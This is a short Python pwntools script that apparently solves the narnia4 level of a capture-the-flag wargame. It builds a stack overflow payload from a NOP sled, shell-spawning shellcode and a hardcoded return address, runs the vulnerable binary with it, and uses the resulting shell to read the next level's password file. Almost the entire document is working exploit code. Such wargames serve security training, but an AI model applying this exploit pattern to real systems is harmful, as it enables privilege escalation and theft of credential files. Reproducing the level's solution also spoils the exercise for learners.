# must be run from the machine - over ssh mangles the payload somehow
# this is basically the same as narnia2 but with a bigger buffer
from pwn import *

shellcode = asm(shellcraft.sh())
payload = flat(
    b'\x90'*(264 - len(shellcode)),
    shellcode,
    0xffffd850,
)

p = process([b'/narnia/narnia4', payload])
p.sendline(b'cat /etc/narnia_pass/narnia5')
print('\nnarnia5 pass: ' + p.recvline().decode())

